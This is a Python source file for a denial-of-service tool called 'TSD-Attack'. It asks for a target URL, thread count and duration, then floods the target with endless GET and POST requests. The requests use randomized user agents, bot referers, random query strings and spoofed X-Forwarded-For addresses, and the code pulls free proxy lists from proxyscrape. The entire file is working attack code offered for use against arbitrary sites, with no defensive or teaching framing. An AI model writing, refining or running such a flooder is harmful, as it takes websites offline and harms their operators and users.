import json
import random
import sys
import warnings
import string
import threading
import time
from typing import Dict, List
import requests
import faker
from colorama import Fore as F
from requests.exceptions import ConnectionError, Timeout
from fake_useragent import UserAgent
import os
from halo import Halo

os.system('clear')


version = "5.8 ( 2024 - 12 - 14 )"
method = "HTTP"

sip = Halo()
print(f"""{F.YELLOW}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⣤⣤⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⣰⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠀{F.CYAN}⢰⣶⣶⣶⣶⣾⣿⣶⠀⠀⢠⣿⠇⠀⠀{F.YELLOW}⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠀⠀⣾⣿⣤⣤⣤⠀⠀⠀⠀⠀⠀
{F.CYAN}⣤⣤⣤⣤⣤⣤⣤⣾⡏⠀⠀⠀⠀⠉⢉⣿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠙⠿⠿⣿⡿⠀⠀⣴⡿⠋⠀{F.YELLOW}⠀⠀⠀⠀⠀⠀⠀
{F.CYAN}⠀⣤⣤⣤⣤⣤⣤⣤⣿⠃⣠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⣿⢧⣾⠟⠁{F.YELLOW}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""")
print('_'*60)

fake = faker.Faker()

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

def get_http_proxies() -> List[Dict[str, str]]:
    proxies = []
    try:
        with requests.get(
            "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=88270",
            verify=False,
        ) as proxy_list_http:
            proxies_http = [
                {"http": "http://" + proxy, "https": "http://" + proxy}
                for proxy in proxy_list_http.text.split("\r\n")
                if proxy != ""
            ]
            proxies.extend(proxies_http)

        with requests.get(
            "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=socks4&proxy_format=ipport&format=text&timeout=88270",
            verify=False,
        ) as proxy_list_socks4:
            proxies_socks4 = [
                {"http": "socks4://" + proxy, "https": "socks4://" + proxy}
                for proxy in proxy_list_socks4.text.split("\r\n")
                if proxy != ""
            ]
            proxies.extend(proxies_socks4)

    except Timeout:
        print(f"\n{F.RED}( !!! ) {F.CYAN}It was not possible to connect to the proxies!{F.RESET}")
        sys.exit(1)
    except ConnectionError:
        print(f"\n{F.RED}( !!! ) {F.CYAN}Device is not connected to the Internet!{F.RESET}")
        sys.exit(1)

    return proxies

proxies = get_http_proxies()

ua = UserAgent()

def buildcookies():
    """Generate random cookies."""
    cookie_count = 1  # عدد الكوكيز العشوائية
    cookies = {}
    for _ in range(cookie_count):
        key = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 10)))
        value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 15)))
        cookies[key] = value


    return cookies

def referesBot():

    with open("../bot/bots.txt", "r") as b:
        bot = b.readlines()
        ranBot = random.choice(bot)
        block = buildBlock(random.randint(3,15))
        
    return ranBot.strip() + block


def generate_headers():
    return {
        "User-Agent": ua.random,
        "X-Requested-With": "XMLHttpRequest",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        #"Accept": "*/*",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": referesBot(),
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Connection": "keep-alive",
        "Keep-Alive": str(random.randint(110,120)),
        #"Cookie": buildcookies(),
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "X-Forwarded-For": fake.ipv4(),
    }

def buildBlock(size):
    out_str = ''
    for _ in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
        
    return(out_str)


def generateRandData():

    return {
        "q": buildBlock(size=random.randint(3,10))+"="+buildBlock(size=random.randint(3,10)),
    }

def flood(target: str) -> None:
    global proxies
    
    type_request = random.choice([
        "GET",
        "POST"
    ])

    headers = generate_headers()
    paramsGet = generateRandData()
    
    while True:
        
        try:
            #proxy = random.choice(proxies)

            if type_request == "GET":
                response = requests.get(target, headers=headers, params=paramsGet, timeout=5)
            else:
                response = requests.post(target, headers=headers, timeout=5)
            
            colorF_G = f"{F.GREEN if response.status_code == 200 else F.RED}"
            status = f"{F.GREEN if response.status_code == 200 else F.RED}({response.status_code}){F.RESET}"
            payload_size = f"{colorF_G} Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
            #proxy_addr = f"| {F.GREEN}Proxy: {F.CYAN}{proxy['http']:>21}"
            request_info = f"{F.CYAN}{type_request}{F.RESET}"
            print(f"{status}:{request_info} Successful Attack! --> {payload_size} {F.RESET}{F.RESET}")
            
        except (Timeout, OSError):
            print(f"{F.RED}( !!! ) {F.RESET}Time Out...")
            continue

        if response.status_code != 200:
            try:
                continue
                #proxies.remove(proxy)
            except ValueError:
                #proxies = get_http_proxies()
                continue

def start_flooding(target: str, thread_count: int, duration: int) -> None:
    stop_time = time.time() + duration
    for _ in range(thread_count):
        thread = threading.Thread(target=flood, args=(target,))
        thread.daemon = True
        thread.start()

    while time.time() < stop_time:
        time.sleep(timeSleep)

    print(f"\n{F.CYAN}( Done ) {F.GREEN}Attack finished after {F.RED}{duration} seconds.{F.RESET}")

if __name__ == "__main__":

    target_url = input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Enter Url{F.CYAN})
└──╼ {F.YELLOW}~: {F.GREEN}''')
    num_threads = int(input(f'''\n{F. CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Threads{F.CYAN})
└──╼ {F.YELLOW}~: {F.GREEN}'''))
    duration = int(input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Time Attack{F.CYAN})
└──╼ {F.YELLOW}~: {F.GREEN}'''))

    timeSleep = int(input(f'''\n{F.CYAN}┌─({F.GREEN}TSD-Attack{F.CYAN})─({F.YELLOW}~ Time Sleep{F.CYAN})
└──╼ {F.YELLOW}~: {F.GREEN}'''))
    
    print(f"""
- {F.GREEN} Attack On : {F.RED} {target_url} {F.RESET}
- {F.GREEN}Time attack : {F.RED}{duration}{F.RESET}
-----------------------------------------------------------
\n
""")
    sipp= Halo(text="Loding ...", spinner="dots")
    sipp.start()
    time.sleep(2)
    sipp.stop()
    start_flooding(target_url, num_threads, duration)
